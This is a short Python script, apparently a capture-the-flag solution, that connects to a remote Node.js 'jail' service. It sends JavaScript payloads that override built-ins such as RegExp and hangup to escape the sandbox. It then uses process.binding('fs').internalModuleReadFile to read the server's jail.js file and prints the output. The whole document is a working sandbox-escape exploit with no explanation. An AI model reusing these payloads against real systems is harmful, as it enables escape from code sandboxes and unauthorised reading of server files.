import socket

sc = socket.create_connection(("jail.alieni.se", 55542))
sc.send("class bar{constructor(x){};test(x){return 0}};function foo(){ask()};hangup=foo;RegExp=bar;123;\n")
sc.send("process.binding('fs').internalModuleReadFile('jail.js');\n")

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    